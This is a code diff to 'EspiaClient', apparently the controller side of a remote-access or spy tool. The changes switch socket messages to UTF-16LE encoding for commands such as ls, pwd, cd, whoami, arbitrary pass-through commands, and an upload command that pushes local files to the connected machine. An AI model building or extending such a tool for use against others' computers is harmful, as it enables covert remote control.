@@ -28,13 +28,13 @@ class EspiaClient(threading.Thread):
             parameters = parameters[1:]
 
             if (command == "ls"):
-                self.connection.send("ls".encode())
+                self.connection.send("ls".encode("utf-16le"))
             elif (command == "pwd"):
-                self.connection.send("pwd".encode())
+                self.connection.send("pwd".encode("utf-16le"))
             elif (command == "cd"):
-                self.connection.send(input_text.encode())
+                self.connection.send(input_text.encode("utf-16le"))
             elif (command == "whoami"):
-                self.connection.send(command.encode())
+                self.connection.send(command.encode("utf-16le"))
             elif (command == "exit"):
                 self.close() 
                 continue
@@ -45,8 +45,8 @@ class EspiaClient(threading.Thread):
                 f = open(parameters[0], "rb")
                 text = f.read()
                 size = len(text)
-                self.connection.send(("upload " + parameters[0]).encode())
-                self.connection.send(("%s" % (size)).encode())
+                self.connection.send(("upload " + parameters[0]).encode("utf-16le"))
+                self.connection.send(("%s" % (size)).encode("utf-16le"))
                 with self.recv_state:
                     self.recv_state.wait()
                 self.connection.sendall(text)
@@ -54,7 +54,7 @@ class EspiaClient(threading.Thread):
             elif (command == ""):
                 pass
             else:
-                msg = input_text.encode("utf8")
+                msg = input_text.encode("utf-16le")
                 print(msg)
                 self.connection.send(msg)
             
@@ -67,7 +67,8 @@ class EspiaClient(threading.Thread):
     def recieve(self):
         while True:
             try:
-                recv_buff = self.connection.recv(1024).decode("utf16")
+                recv_buff = self.connection.recv(1024)
+                recv_buff = recv_buff.decode("utf-16le")
                 if (recv_buff[-6:-1] == "<end>"):              # For some reason, '<end>' that is in recv_buff will be actually ['<','','e','','n','','d','','>'] so normal comparison won't work, so those '' need to be removed
                     self.final += recv_buff[0:-12]
                     with self.recv_state:
